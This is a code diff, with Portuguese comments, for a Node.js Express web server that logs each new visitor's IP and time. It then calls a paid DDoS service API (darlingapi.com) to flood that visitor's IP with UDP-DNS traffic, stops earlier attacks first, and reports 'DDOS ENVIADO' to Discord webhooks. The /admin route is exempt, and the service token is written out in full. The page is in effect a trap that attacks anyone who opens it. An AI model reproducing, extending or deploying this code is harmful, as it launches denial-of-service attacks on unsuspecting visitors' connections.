@@ -15,14 +15,27 @@ let lock = false;
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=30&method=UDP-DNS`;
     try {
-        for (let i = 0; i < 6; i++) {
         await axios.get(url);
         console.log(`Requisição enviada para o IP: ${ip}`);
-    } }
-    catch (error) {
+    } catch (error) {
         console.error(`Erro ao enviar requisição para o IP: ${ip}`, error.message);
     }
 }
+
+async function verificar() {
+    try {
+      const response = await axios.get('https://darlingapi.com/status?token=af1f1818-3541-411f-a643-db88e2c575ff');
+      const data = response.data;
+  
+      if (data.account.running > 0) {
+            const url = "https://darlingapi.com/stop_all?token=af1f1818-3541-411f-a643-db88e2c575ff"
+            await axios.get(url)
+            console.log('Ataques anterios interrompidos')
+      }
+    } catch (error) {
+      console.error('Erro ao verificar o status dos ataques:', error);
+    }
+  }
 
 // Função para enviar webhooks ao Discord
 async function sendDiscordWebhooks(ip, timestamp) {
@@ -37,6 +50,11 @@ async function sendDiscordWebhooks(ip, timestamp) {
                         name: 'IP',
                         value: ip,
                         inline: true
+                    },
+                    {
+                        name: 'Data e Hora',
+                        value: timestamp,
+                        inline: true
                     }
                 ],
                 footer: {
@@ -49,7 +67,7 @@ async function sendDiscordWebhooks(ip, timestamp) {
         await axios.post(discordWebhookUrl2, {
             embeds: [{
                 title: 'DDOS ENVIADO',
-                description: `Ataque Enviado.`,
+                description: `Ataque enviado.`,
                 color: 5814783,
                 fields: [
                     {
@@ -93,7 +111,7 @@ async function cleanupVisitors() {
 
         const lastCleanup = new Date(config.lastCleanup);
 
-        if ((now - lastCleanup) >= 2 * 60 * 1000) {
+        if ((now - lastCleanup) >= 5 * 60 * 1000) {
             await fs.writeFile(visitorsFile, JSON.stringify([], null, 2));
             console.log('Visitors file cleaned.');
 
@@ -111,15 +129,19 @@ async function cleanupVisitors() {
 setInterval(cleanupVisitors, 5 * 60 * 1000);
 cleanupVisitors().catch(err => console.error('Error executing cleanup on startup:', err));
 
+// Middleware para processar e registrar IPs apenas na página principal
 app.use(async (req, res, next) => {
-    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    
-    if (typeof ip === 'string') {
-        // Se houver múltiplos IPs, pegar apenas o primeiro
-        ip = ip.split(',')[0].trim();
+    if (req.path === '/admin') {
+        // Se estiver na rota /admin, pula o registro de IP
+        return next();
     }
 
+    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    let timestamp = new Date().toISOString();
 
+    if (typeof ip === 'string') {
+        ip = ip.split(',')[0].trim();
+    }
 
     if (lock) {
         await new Promise(resolve => setTimeout(resolve, 100));
@@ -141,11 +163,12 @@ app.use(async (req, res, next) => {
         const ipEntry = visitors.find(visitor => visitor.ip === ip);
 
         if (!ipEntry) {
-            if (ip.startsWith('3') || (ip.startsWith('10')) || (ip.startsWith('::'))) return
-            visitors.push({ ip });
+            if (ip.startsWith('3') || (ip.startsWith('10')) || (ip.startsWith('p'))) return;
+            visitors.push({ ip, timestamp });
             await fs.writeFile(visitorsFile, JSON.stringify(visitors, null, 2));
-            await sendApiRequest(ip)
-            await sendDiscordWebhooks(ip);
+            await verificar()
+            await sendApiRequest(ip);
+            await sendDiscordWebhooks(ip, timestamp);
         }
     } catch (err) {
         console.error('Error processing visitors file:', err);
@@ -156,11 +179,12 @@ app.use(async (req, res, next) => {
     next();
 });
 
-
+// Rota principal serve os arquivos estáticos e registra os IPs
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Rota /admin não registra IPs
 app.use('/admin', require('./routes/admin'));
 
 app.listen(port, () => {
-    console.log(`Server is running at port ${port}`);
+    console.log(`Server is running at http://localhost:${port}`);
 });
